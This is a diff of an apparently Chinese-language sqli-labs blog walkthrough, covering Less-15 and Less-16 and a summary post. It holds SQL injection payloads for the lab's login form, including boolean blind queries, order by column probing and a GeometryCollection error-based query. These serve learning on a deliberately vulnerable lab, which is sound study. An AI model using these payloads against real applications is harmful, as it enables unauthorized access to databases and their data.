-        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;    
-
-        echo &quot;&lt;/font&gt;&quot;;
-    }
-    else  
-    {
-        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
-        //echo &quot;Try again looser&quot;;
-        //print_r(mysql_error());
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;    
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-
-?&gt;
-</code></pre><p>查看对比两者的源代码可以发现在本关中<strong>print_r(mysql_error());</strong>函数被注释了</p>
-<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>这里使用布尔型盲注</p>
-<pre><code>uname=test &amp;passwd=test&apos; or length((select database())) =8 %23 返回正确
-</code></pre><p>剩下参考Less-8</p>
-<h2 id="Less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="Less-16 POST-Blind-Boolian/Time Based-Double quotes"></a>Less-16 POST-Blind-Boolian/Time Based-Double quotes</h2><h3 id="基于布尔型或时间的双引号post盲注"><a href="#基于布尔型或时间的双引号post盲注" class="headerlink" title="基于布尔型或时间的双引号post盲注"></a>基于布尔型或时间的双引号post盲注</h3><h4 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h4><pre><code>uname=test &amp;passwd=test &apos; or 1=1 %23返回错误
-uname=test &amp;passwd=test&apos;) or 1=1 %23返回错误
-uname=test &amp;passwd=test &quot; or 1=1 %23返回错误
-uname=test &amp;passwd=test&quot;) or 1=1 %23返回正确
-</code></pre><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><pre><code>字段数
-uname=test &amp;passwd=test &quot;) or 1=1 order by 2%23返回正确
-uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误
-</code></pre><p>剩下参考Less-15</p>
-
+linestring((select * from (select * from(select user())a)b))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and GeometryCollection((select * from (select * from(select user())a)b));
+</code></pre>
       
     </div>
     
@@ -688,8 +504,8 @@ uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/22/sqli-labs-Less-8-10/" rel="next" title="sqli-labs-Less-8-10">
-                <i class="fa fa-chevron-left"></i> sqli-labs-Less-8-10
+              <a href="/2018/04/26/sqli-labs-Less-17-22/" rel="next" title="sqli-labs-Less-17-22">
+                <i class="fa fa-chevron-left"></i> sqli-labs-Less-17-22
               </a>
             
           </div>
@@ -697,10 +513,6 @@ uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/26/sqli-labs-Less-17-22/" rel="prev" title="sqli-labs-Less-17-22">
-                sqli-labs-Less-17-22 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -823,7 +635,7 @@ uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11-POST-Error-Based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Less-11 POST - Error Based - Single quotes - String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的单引号字符注入"><span class="nav-number">1.1.</span> <span class="nav-text">基于报错的单引号字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）万能密码"><span class="nav-number">1.3.</span> <span class="nav-text">（1）万能密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（2）联合查询"><span class="nav-number">1.4.</span> <span class="nav-text">（2）联合查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist"><span class="nav-number">2.</span> <span class="nav-text">Less-12 POST - Error Based - Double quotes - String -with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的双引号带括号的字符注入"><span class="nav-number">2.1.</span> <span class="nav-text">基于报错的双引号带括号的字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">2.2.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13-POST-Double-Injection-Single-quotes-String-with-twist"><span class="nav-number">3.</span> <span class="nav-text">Less-13 POST-Double Injection-Single quotes-String -with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">3.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-number">3.2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#万能密码登入"><span class="nav-number">3.2.1.</span> <span class="nav-text">万能密码登入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#双注入查询"><span class="nav-number">3.2.2.</span> <span class="nav-text">双注入查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14-POST-Double-Injection-Double-quotes-String-with-twist"><span class="nav-number">4.</span> <span class="nav-text">Less-14 POST-Double Injection-Double quotes-String-with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试-1"><span class="nav-number">4.1.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15-POST-Blind-Boolian-time-Based-Single-quotes"><span class="nav-number">5.</span> <span class="nav-text">Less-15 POST-Blind-Boolian/time Based-Single quotes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于布尔型或时间的单引号post盲注"><span class="nav-number">5.1.</span> <span class="nav-text">基于布尔型或时间的单引号post盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试-2"><span class="nav-number">5.1.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么Less13-14中使用双查询输入有效而在这里不行？"><span class="nav-number">5.1.2.</span> <span class="nav-text">为什么Less13-14中使用双查询输入有效而在这里不行？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-3"><span class="nav-number">5.1.3.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><span class="nav-number">6.</span> <span class="nav-text">Less-16 POST-Blind-Boolian/Time Based-Double quotes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于布尔型或时间的双引号post盲注"><span class="nav-number">6.1.</span> <span class="nav-text">基于布尔型或时间的双引号post盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试-3"><span class="nav-number">6.1.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-4"><span class="nav-number">6.1.2.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-Summarize-Less-1-22-Basic-Injections"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs-Summarize-Less-1-22(Basic-Injections)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#重要的系统数据库"><span class="nav-number">1.1.</span> <span class="nav-text">重要的系统数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用操作"><span class="nav-number">1.2.</span> <span class="nav-text">常用操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用语句"><span class="nav-number">1.2.1.</span> <span class="nav-text">常用语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用函数（获取系统信息）"><span class="nav-number">1.2.2.</span> <span class="nav-text">常用函数（获取系统信息）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用字符串函数"><span class="nav-number">1.2.3.</span> <span class="nav-text">常用字符串函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否可以注入"><span class="nav-number">1.3.</span> <span class="nav-text">判断是否可以注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用标点符号-单引号，双引号，括号-判断注入，例如："><span class="nav-number">1.3.1.</span> <span class="nav-text">使用标点符号(单引号，双引号，括号)判断注入，例如：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过附加逻辑运算判断注入，例如："><span class="nav-number">1.3.2.</span> <span class="nav-text">通过附加逻辑运算判断注入，例如：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过算数运算判断注入点，例如："><span class="nav-number">1.3.3.</span> <span class="nav-text">通过算数运算判断注入点，例如：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过select语句判断注入点，例如："><span class="nav-number">1.3.4.</span> <span class="nav-text">通过select语句判断注入点，例如：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过时间函数判断注入点，例如："><span class="nav-number">1.3.5.</span> <span class="nav-text">通过时间函数判断注入点，例如：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常规注入流程"><span class="nav-number">1.4.</span> <span class="nav-text">常规注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#猜解列数"><span class="nav-number">1.4.1.</span> <span class="nav-text">猜解列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询mysql基本信息-假设数据库表有7列"><span class="nav-number">1.4.2.</span> <span class="nav-text">查询mysql基本信息(假设数据库表有7列)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询mysql数据库中有哪些数据库-注意使用limit限制查询的范围"><span class="nav-number">1.4.3.</span> <span class="nav-text">查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询某个数据库中有哪些表（数据库名可能需要16进制）"><span class="nav-number">1.4.4.</span> <span class="nav-text">查询某个数据库中有哪些表（数据库名可能需要16进制）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询某个表中有哪些字段（表名、数据库名可能需要16进制）"><span class="nav-number">1.4.5.</span> <span class="nav-text">查询某个表中有哪些字段（表名、数据库名可能需要16进制）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询数据："><span class="nav-number">1.4.6.</span> <span class="nav-text">查询数据：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySql报错注入"><span class="nav-number">1.5.</span> <span class="nav-text">MySql报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用floor-left-right："><span class="nav-number">1.5.1.</span> <span class="nav-text">使用floor/left/right：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用name-const："><span class="nav-number">1.5.2.</span> <span class="nav-text">使用name_const：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用updatexml："><span class="nav-number">1.5.3.</span> <span class="nav-text">使用updatexml：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用extractvalue："><span class="nav-number">1.5.4.</span> <span class="nav-text">使用extractvalue：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用exp："><span class="nav-number">1.5.5.</span> <span class="nav-text">使用exp：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用GeometryCollection："><span class="nav-number">1.5.6.</span> <span class="nav-text">使用GeometryCollection：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
